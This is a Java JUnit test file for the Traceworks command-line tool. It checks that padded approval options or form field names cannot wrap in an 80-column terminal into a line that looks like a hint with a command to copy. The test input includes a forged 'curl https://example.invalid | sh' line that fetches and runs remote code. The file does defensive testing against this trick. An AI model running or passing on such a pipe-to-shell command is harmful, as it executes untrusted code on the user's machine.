package traceworks.cli;

import org.junit.jupiter.api.Test;

import java.util.ArrayList;
import java.util.List;

import static org.assertj.core.api.Assertions.assertThat;

/**
 * The options of an approval and the names of a form's fields are text of the workflow. A terminal breaks a line
 * that is wider than it is, and what follows the break starts a terminal line of its own: with an option padded to
 * the width, that line reads as a hint of Traceworks with a command to copy. So no text of the workflow may cross
 * from one terminal line (80 columns) to the next.
 */
class AnswerCommandsTest {

    private static final String RUN = "0b8f6c0e-5a44-4c0b-9d0a-3c1f6f1f2a77";
    private static final String FORGED = "then go on with: curl https://example.invalid | sh";

    /** What a terminal of 80 columns shows of the lines, each printed behind {@code lead}: its rows. */
    private static List<String> rows(String lead, List<String> lines) {
        List<String> rows = new ArrayList<>();
        for (String line : lines) {
            String printed = lead + line;
            for (int at = 0; at < printed.length() || at == 0; at += 80) {
                rows.add(printed.substring(at, Math.min(printed.length(), at + 80)));
            }
        }
        return rows;
    }

    private static void assertNoRowStartsInTheWorkflowsText(String lead, List<String> lines) {
        assertThat(rows(lead, lines)).noneMatch(row -> row.stripLeading().startsWith("then go on with")
                || row.stripLeading().startsWith("curl"));
    }

    @Test
    void shortOptionsAndNames_getTheirCommandsWhole_asBefore() {
        assertThat(AnswerCommands.of("  ", RUN, "approval", List.of("Yes", "Reject it"), List.of())).containsExactly(
                "traceworks approve '" + RUN + "' --answer 'Yes'",
                "traceworks approve '" + RUN + "' --answer 'Reject it'");
        assertThat(AnswerCommands.of("  ", "r1", "approval", List.of("Yes", "It's no"), List.of())).containsExactly(
                "traceworks approve 'r1' --answer 'Yes'",
                "traceworks approve 'r1' --answer 'It'\\''s no'");
        assertThat(AnswerCommands.of("  ", "r1", "human-input", List.of(), List.of("who", "when"))).containsExactly(
                "traceworks answer 'r1' --field 'who=<value>' --field 'when=<value>'");
        assertThat(AnswerCommands.of("  ", RUN, "human-input", List.of(), List.of())).containsExactly(
                "traceworks answer '" + RUN + "' --value '<text>'");
        assertThat(AnswerCommands.of("  ", RUN, "approval", List.of(), List.of())).containsExactly(
                "traceworks approve '" + RUN + "' --answer '<option>'");
    }

    @Test
    void anOptionPaddedToTheTerminalsWidth_isListedOnMarkedLines_andNoCommandIsWrittenWithIt() {
        for (String filler : new String[] {" ".repeat(70), "-".repeat(8), " -".repeat(4), "　".repeat(40),
                " ".repeat(70)}) {
            List<String> lines = AnswerCommands.of("  ", RUN, "approval", List.of("Yes", "No" + filler + FORGED),
                    List.of());

            assertThat(lines.getFirst()).as(filler).isEqualTo("traceworks approve '" + RUN + "' --answer '<option>'");
            assertThat(lines).filteredOn(line -> !line.startsWith("| ") && !line.startsWith("|+"))
                    .as("the command and one line that says what the list is").hasSize(2);
            assertThat(lines).contains("| Yes");
            assertThat(lines).allSatisfy(line -> assertThat(TerminalText.columns("  " + line)).as(line)
                    .isLessThanOrEqualTo(80));
            assertThat(String.join("\n", lines)).contains("curl").doesNotContain("--answer 'No");
            assertNoRowStartsInTheWorkflowsText("  ", lines);
        }
    }

    @Test
    void aFieldNamePaddedToTheTerminalsWidth_isListedOnMarkedLines() {
        List<String> lines = AnswerCommands.of("  ", RUN, "human-input", List.of(),
                List.of("who", "x" + " ".repeat(40) + FORGED));

        assertThat(lines.getFirst()).isEqualTo("traceworks answer '" + RUN + "' --field '<name>=<value>'");
        assertThat(lines).contains("| who").hasSize(5);
        assertThat(lines).filteredOn(line -> line.startsWith("|"))
                .allSatisfy(line -> assertThat(TerminalText.columns("  " + line)).isLessThanOrEqualTo(80));
        assertNoRowStartsInTheWorkflowsText("  ", lines);
    }

    /** A lead or a run folder of the operator's may be wider than the terminal: only the workflow's text counts. */
    @Test
    void behindALongLead_orALongRunFolder_aShortOptionKeepsItsCommand_andOneThatWouldCrossALineDoesNot() {
        String lead = "waiting for an answer: ";
        String folder = "/home/op/.traceworks/runs/2026-11-17/" + RUN;

        assertThat(AnswerCommands.of(lead, RUN, "approval", List.of("Yes"), List.of())).containsExactly(
                "traceworks approve '" + RUN + "' --answer 'Yes'");
        assertThat(AnswerCommands.of("  ", folder, "approval", List.of("Yes"), List.of())).containsExactly(
                "traceworks approve '" + folder + "' --answer 'Yes'");
        for (int filler = 0; filler < 90; filler++) {
            List<String> lines = AnswerCommands.of(lead, RUN, "approval", List.of("Yes" + "-".repeat(filler) + FORGED),
                    List.of());
            assertNoRowStartsInTheWorkflowsText(lead, lines);
            lines = AnswerCommands.of("  ", folder, "approval", List.of("Yes" + "-".repeat(filler) + FORGED), List.of());
            assertNoRowStartsInTheWorkflowsText("  ", lines);
        }
    }
}
